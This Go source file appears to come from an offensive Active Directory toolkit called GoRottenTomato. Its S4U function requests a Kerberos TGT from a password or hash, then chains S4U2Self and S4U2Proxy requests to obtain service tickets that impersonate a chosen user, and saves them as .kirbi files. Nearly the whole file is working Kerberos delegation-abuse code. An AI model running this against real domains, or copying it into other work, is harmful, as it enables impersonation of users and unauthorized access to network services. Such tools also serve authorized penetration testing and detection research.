package module

import (
	"GoRottenTomato/krb5/AskTGT"
	"GoRottenTomato/krb5/S4U2"
	"GoRottenTomato/krb5/flags"
	"GoRottenTomato/krb5/procedure"
	"GoRottenTomato/krb5/types"
	"fmt"
	"strings"
)

func S4U(tgt, tgs procedure.KRB_CRED, dcIP, service, impersonate, domain, username, password, hash string, altservice []string, noPac, save bool, eType int32) (err error) {
	switch  {
	case tgt.IsEmpty() && tgs.IsEmpty():
		var asrep *procedure.AS_REP
		asrep, err = AskTGT.AskTGT(domain, username, password, dcIP, hash, noPac, eType)
		if err != nil {
			return err
		}
		fmt.Printf("[+]TGT request successful!\n")
		tgt = *asrep.GetTGT()
		fallthrough

	case !tgt.IsEmpty() && tgs.IsEmpty():
		var creds []procedure.KRB_CRED
		creds, err = S4U2.S4U2Self(dcIP, impersonate, altservice, tgt)
		if err != nil {
			return fmt.Errorf("request S4U2Self error: %v", err)
		}


		if save {
			//TODO Support .kirbi && .ccache
			for _, value := range creds{
				path := "TGSFor" + value.DecEncPart.Ticket_Info[0].PName.Name_String[0] + "@" + value.DecEncPart.Ticket_Info[0].PRealm + "To" + value.Tickets[0].SName.Name_String[0] + "@" + value.Tickets[0].Realm + strings.Replace(service, "/", "~", -1) + "S4U2Self.kirbi"
				blob, err := value.Marshal()
				if err != nil {
					fmt.Printf("[-]save %s failed\n", path)
				}else {
					err = saveFile(path, blob)
					if err != nil {
						fmt.Printf("[-]save %s failed\n", path)
					}
				}
			}
		}
		tgs = creds[0]
		fallthrough

	case !tgt.IsEmpty() && !tgs.IsEmpty():
		var cred procedure.KRB_CRED
		spn := types.PrincipalName{
			Name_Type: flags.NT_SRV_INST,
			Name_String: strings.Split(service, "/"),
		}
		cred, err = S4U2.S4U2Proxy(tgt, tgs, dcIP, spn)
		if err != nil {
			return fmt.Errorf("request S4U2Proxy error: %v", err)
		}
		Display(&cred)
		if save {
			//TODO Support .kirbi && .ccache
			path := "TGSFor" + cred.DecEncPart.Ticket_Info[0].PName.Name_String[0] + "@" + cred.DecEncPart.Ticket_Info[0].PRealm + "To" + cred.Tickets[0].SName.Name_String[0] + "@" + cred.Tickets[0].Realm + strings.Replace(service, "/", "~", -1) + "S4U2Proxy.kirbi"
			blob, err := cred.Marshal()
			if err != nil {
				fmt.Printf("[-]save %s failed\n", path)
			}else {
				err = saveFile(path, blob)
				if err != nil {
					fmt.Printf("[-]save %s failed\n", path)
				}
			}
		}
		return nil

	default:
		return fmt.Errorf("S4U2 Parameter error")
	}
}

